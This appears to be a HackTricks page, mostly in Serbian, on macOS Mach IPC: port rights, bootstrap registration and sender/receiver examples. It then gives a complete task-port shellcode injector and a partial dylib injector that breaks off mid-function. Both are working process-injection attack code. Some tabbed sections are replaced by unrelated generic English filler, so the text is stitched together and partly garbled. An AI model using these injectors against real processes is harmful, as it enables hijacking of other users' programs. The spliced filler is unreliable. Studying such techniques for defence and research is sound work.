# macOS IPC - Inter Process Communication

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodiču PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Mach poruke putem portova

### Osnovne informacije

Mach koristi **taskove** kao **najmanju jedinicu** za deljenje resursa, pri čemu svaki task može sadržati **više niti**. Ovi **taskovi i niti se mapiraju 1:1 na POSIX procese i niti**.

Komunikacija između taskova se odvija putem Mach Inter-Process Communication (IPC), koristeći jednosmjerne komunikacione kanale. **Poruke se prenose između portova**, koji deluju kao **redovi poruka** upravljani od strane jezgra.

Svaki proces ima **IPC tabelu**, u kojoj je moguće pronaći **mach portove procesa**. Ime mach porta zapravo predstavlja broj (pokazivač na jezgro objekta).

Proces takođe može poslati ime porta sa određenim pravima **drugom tasku** i jezgro će napraviti ovaj unos u **IPC tabeli drugog taska**.

### Prava portova

Prava portova, koja definišu koje operacije task može izvršiti, ključna su za ovu komunikaciju. Moguća **prava portova** su ([definicije odavde](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Pravo na prijem**, koje omogućava prijem poruka poslatih na port. Mach portovi su MPSC (multiple-producer, single-consumer) redovi, što znači da može postojati samo **jedno pravo na prijem za svaki port** u celom sistemu (za razliku od cevi, gde više procesa može držati deskriptore fajlova za čitanje sa jednog kraja cevi).
* Task sa **Pravom na prijem** može primati poruke i **kreirati Prava na slanje**, omogućavajući mu slanje poruka. Originalno, samo **sopstveni task ima Pravo na prijem nad svojim portom**.
* **Pravo na slanje**, koje omogućava slanje poruka na port.
* Pravo na slanje može biti **klonirano** tako da task koji poseduje Pravo na slanje može klonirati pravo i **dodeliti ga trećem tasku**.
* **Pravo na jednokratno slanje**, koje omogućava slanje jedne poruke na port i zatim nestaje.
* **Pravo na set portova**, koje označava _set portova_ umesto pojedinačnog porta. Skidanje poruke sa seta portova skida poruku sa jednog od portova koje sadrži. Set portova se može koristiti za osluškivanje više portova istovremeno, slično kao `select`/`poll`/`epoll`/`kqueue` u Unix-u.
* **Mrtvo ime**, koje nije stvarno pravo porta, već samo rezervacija. Kada se port uništi, sva postojeća prava porta na port postaju mrtva imena.

**Taskovi mogu preneti PRAVA NA SLANJE drugima**, omogućavajući im da šalju poruke nazad. **PRAVA NA SLANJE takođe mogu biti klonirana, tako da task može duplicirati i dati pravo trećem tasku**. Ovo, zajedno sa posredničkim procesom poznatim kao **bootstrap server**, omogućava efikasnu komunikaciju između taskova.

### Portovi fajlova

Portovi fajlova omogućavaju da se deskriptori fajlova enkapsuliraju u Mac portove (koristeći Prava na Mach portovima). Moguće je kreirati `fileport` od datog FD koristeći `fileport_makeport` i kreirati FD iz fileporta koristeći `fileport_makefd`.

### Uspostavljanje komunikacije

#### Koraci:

Kako je pomenuto, da bi se uspostavio kanal komunikacije, uključen je **bootstrap server** (**launchd** na Mac-u).

1. Task **A** pokreće **novi port**, dobijajući **PRAVO NA PRIJEM** u procesu.
2. Task **A**, kao nosilac PRAVA NA PRIJEM, **generiše PRAVO NA SLANJE za port**.
3. Task **A** uspostavlja **vezu** sa **bootstrap serverom**, pružajući **servisno ime porta** i **PRAVO NA SLANJE** kroz proceduru poznatu kao registracija bootstrap-a.
4. Task **B** interaguje sa **bootstrap serverom** kako bi izvršio bootstrap **pretragu za servisnim** imenom. Ukoliko je uspešno, **server duplira PRAVO NA SLANJE** primljeno od Task A i **prebacuje ga Task B**.
5. Nakon što dobije PRAVO NA SLANJE, Task **B** je sposoban da **formuliše** poruku i pošalje je **Task A**.
6. Za dvosmernu komunikaciju obično task **B** generiše novi port sa **PRAVOM NA PRIJEM** i **PRAVOM NA SLANJE**, i daje **PRAVO NA SLANJE Task A** kako bi mogao slati poruke TASK B (dvosmerna komunikacija).

Bootstrap server **ne može autentifikovati** servisno ime koje tvrdi task. Ovo znači da bi **task** potencijalno mogao **predstavljati bilo koji sistemski task**, kao što je lažno **tvrditi ime servisa za autorizaciju** a zatim odobravati svaki zahtev.

Zatim, Apple čuva **imena servisa koje pruža sistem** u sigurnim konfiguracionim fajlovima, smeštenim u **SIP-zaštićenim** direktorijumima: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Pored svakog imena servisa, takođe je sačuvana **povezana binarna datoteka**. Bootstrap server će kreirati i držati **PRAVO NA PRIJEM za svako od ovih imena servisa**.

Za ove unapred definisane servise, **proces pretrage se malo razlikuje**. Kada se traži ime servisa, launchd pokreće servis dinamički. Novi tok rada je sledeći:

* Task **B** pokreće bootstrap **pretragu** za imenom servisa.
* **launchd** proverava da li je task pokrenut i ako nije, ga **pokreće**.
* Task **A** (servis) izvršava **bootstrap check-in**. Ovde, **bootstrap** server kreira PRAVO NA SLANJE, zadržava ga, i **prebacuje PRAVO NA PRIJEM Task A**.
* launchd duplira **PRAVO NA SLANJE i šalje ga Task B**.
* Task **B** generiše novi port sa **PRAVOM NA PRIJEM** i **PRAVOM NA SLANJE**, i daje **PRAVO NA SLANJE Task A** (servisu) kako bi mogao slati poruke TASK B (dvosmerna komunikacija).

Međutim, ovaj proces se odnosi samo na unapred definisane sistemski taskove. Ne-sistemski taskovi i dalje funkcionišu kao što je opisano originalno, što potencijalno može omogućiti predstavljanje. 

### Mach poruka

[Pronađite više informacija ovde](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcija `mach_msg`, suštinski sistemski poziv, koristi se za slanje i primanje Mach poruka. Funkcija zahteva da poruka bude poslata kao početni argument. Ova poruka mora početi sa strukturom `mach_msg_header_t`, praćenom stvarnim sadržajem poruke. Struktura je definisana na sledeći način:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesi koji poseduju _**pravo na prijem**_ mogu primati poruke na Mach portu. Nasuprot tome, **pošiljaoci** dobijaju _**slanje**_ ili _**jednokratno pravo slanja**_. Jednokratno pravo slanja je isključivo za slanje jedne poruke, nakon čega postaje nevažeće.

Da bi postigli jednostavnu **bidirekcionalnu komunikaciju**, proces može odrediti **mach port** u mach **zaglavlju poruke** nazvanom _port za odgovor_ (**`msgh_local_port`**) gde **primalac** poruke može **poslati odgovor** na tu poruku. Bitovi u **`msgh_bits`** se mogu koristiti da **pokažu** da bi trebalo izvesti i preneti **jednokratno pravo slanja** za ovaj port (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Imajte na umu da se ovakva vrsta bidirekcionalne komunikacije koristi u XPC porukama koje očekuju odgovor (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ali se **obično stvaraju različiti portovi** kako je objašnjeno ranije da bi se uspostavila bidirekcionalna komunikacija.
{% endhint %}

Ostala polja zaglavlja poruke su:

- `msgh_size`: veličina celog paketa.
- `msgh_remote_port`: port na koji je poslata ova poruka.
- `msgh_voucher_port`: [mach vaučeri](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: ID ove poruke, koji tumači primalac.

{% hint style="danger" %}
Imajte na umu da se **mach poruke šalju preko \_mach porta**\_, koji je **kanal komunikacije sa jednim primaocem** i **više pošiljalaca** ugrađen u mach jezgro. **Više procesa** može **slati poruke** na mach port, ali u svakom trenutku samo **jedan proces može čitati** sa njega.
{% endhint %}

### Nabrojavanje portova
```bash
lsmp -p <pid>
```
Možete instalirati ovaj alat u iOS preuzimanjem sa [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Primer koda

Obratite pažnju kako **pošiljalac** **dodeljuje** port, kreira **send right** za ime `org.darlinghq.example` i šalje ga **bootstrap serveru** dok je pošiljalac zatražio **send right** za to ime i koristio ga je da **pošalje poruku**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

## macOS IPC (Inter-Process Communication)

### macOS IPC Overview

macOS provides several mechanisms for inter-process communication (IPC) between processes. These mechanisms include:

- **Mach Messages**: Low-level IPC mechanism used by the macOS kernel to manage inter-process communication.
- **XPC Services**: High-level API for creating and managing XPC services for IPC.
- **Distributed Objects**: Framework for distributed computing that can be used for IPC.
- **Unix Domain Sockets**: Inter-process communication between processes on the same host using socket programming.

### Understanding macOS IPC

Inter-Process Communication (IPC) is essential for processes to communicate and coordinate with each other on macOS. By leveraging IPC mechanisms, processes can share data, resources, and synchronize their activities. Understanding how IPC works on macOS is crucial for developing secure and efficient applications.

### IPC Security Considerations

When implementing IPC in macOS applications, developers need to consider security implications to prevent unauthorized access and data leakage. Some security considerations for macOS IPC include:

- **Authentication**: Implement proper authentication mechanisms to ensure that only authorized processes can communicate.
- **Authorization**: Enforce strict authorization policies to control which processes can access specific IPC mechanisms.
- **Data Encryption**: Use encryption to protect sensitive data transmitted via IPC channels.
- **Input Validation**: Validate input data to prevent injection attacks and ensure data integrity.
- **Error Handling**: Implement robust error handling to prevent crashes and potential security vulnerabilities.

By following security best practices and understanding the intricacies of macOS IPC mechanisms, developers can build secure and reliable applications that leverage inter-process communication effectively.

### References

- [Apple Developer Documentation on XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
- [Apple Developer Documentation on Distributed Objects](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/DistrObjects.html)
- [Apple Developer Documentation on Unix Domain Sockets](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man7/unix.7.html)

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### Privilegovani portovi

- **Port domaćina**: Ako proces ima **Send** privilegiju nad ovim portom, može dobiti **informacije** o **sistemu** (npr. `host_processor_info`).
- **Privilegovani port domaćina**: Proces sa **Send** pravom nad ovim portom može izvršiti **privilegovane akcije** poput učitavanja kernel ekstenzije. **Proces mora biti root** da bi dobio ovo ovlašćenje.
- Osim toga, da bi pozvao **`kext_request`** API, potrebno je imati druge dozvole **`com.apple.private.kext*`** koje su date samo Apple binarnim fajlovima.
- **Port naziva zadatka**: Neprivilegovana verzija _ports zadatka_. Referiše na zadatak, ali ne dozvoljava kontrolisanje istog. Jedina stvar koja je dostupna kroz njega je `task_info()`.
- **Port zadatka** (poznat i kao kernel port)**:** Sa Send dozvolom nad ovim portom moguće je kontrolisati zadatak (čitanje/pisanje memorije, kreiranje niti...).
- Pozovi `mach_task_self()` da **dobiješ naziv** za ovaj port za pozivaoca zadatka. Ovaj port se nasleđuje samo preko **`exec()`**; novi zadatak kreiran sa `fork()` dobija novi zadatak port (kao poseban slučaj, zadatak takođe dobija novi zadatak port nakon `exec()` u suid binarnom fajlu). Jedini način da pokreneš zadatak i dobiješ njegov port je da izvedeš ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) dok radi `fork()`.
- Ovo su ograničenja za pristup portu (iz `macos_task_policy` iz binarnog fajla `AppleMobileFileIntegrity`):
  - Ako aplikacija ima **dozvolu `com.apple.security.get-task-allow`**, procesi od **istog korisnika mogu pristupiti portu zadatka** (obično dodato od strane Xcode-a za debagovanje). Proces notarizacije neće dozvoliti ovo za produkcijska izdanja.
  - Aplikacije sa dozvolom **`com.apple.system-task-ports`** mogu dobiti **port zadatka za bilo** koji proces, osim kernela. U starijim verzijama se nazivalo **`task_for_pid-allow`**. Ovo je dato samo Apple aplikacijama.
  - **Root može pristupiti portovima zadatka** aplikacija **koje nisu** kompajlirane sa **hardened** izvršnom datotekom (i ne od strane Apple-a).

### Ubacivanje shell koda u nit putem Task porta

Možeš preuzeti shell kod sa:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

### macOS IPC (Inter-Process Communication)

Inter-process communication (IPC) mechanisms are used by macOS applications to communicate with each other. Understanding how IPC works is crucial for privilege escalation and lateral movement during a penetration test.

#### Mach Messages

Mach messages are a fundamental IPC mechanism in macOS. They are used for communication between processes and the kernel. By analyzing the entitlements.plist file, you can identify which processes have permission to send and receive Mach messages, potentially leading to privilege escalation opportunities.

#### XPC Services

XPC services are another common IPC mechanism in macOS. They allow applications to create and manage lightweight processes for specific tasks. Analyzing the entitlements of XPC services can reveal potential security weaknesses that could be exploited for privilege escalation.

#### Distributed Objects

Distributed Objects is an IPC mechanism that enables communication between processes on the same or different machines. Understanding how Distributed Objects are used in macOS applications can help identify potential attack vectors for privilege escalation.

By analyzing the entitlements.plist file and understanding how IPC mechanisms work in macOS, you can uncover security vulnerabilities that may be leveraged for privilege escalation and other malicious activities. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompajlujte** prethodni program i dodajte **ovlašćenja** da biste mogli da ubacite kod sa istim korisnikom (ako ne, moraćete koristiti **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Ubacivanje Dylib-a u nit putem Task porta

Na macOS-u se **niti** mogu manipulisati putem **Mach** ili korišćenjem **posix `pthread` api**. Nit koju smo generisali u prethodnom ubacivanju, generisana je korišćenjem Mach api-ja, tako da **nije posix kompatibilna**.

Bilo je moguće **ubaciti jednostavan shellcode** za izvršavanje komande jer **nije bilo potrebno raditi sa posix** kompatibilnim api-jima, već samo sa Mach-om. **Složenije ubacivanje** bi zahtevalo da **nit** takođe bude **posix kompatibilna**.

Stoga, da bismo **unapredili nit**, trebalo bi da pozovemo **`pthread_create_from_mach_thread`** koji će **kreirati validnu pthread**. Zatim, ova nova pthread bi mogla **pozvati dlopen** da **učita dylib** sa sistema, tako da umesto pisanja novog shellcode-a za obavljanje različitih akcija, moguće je učitati prilagođene biblioteke.

Možete pronaći **primer dylib-ova** u (na primer onaj koji generiše log i zatim možete da ga slušate):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
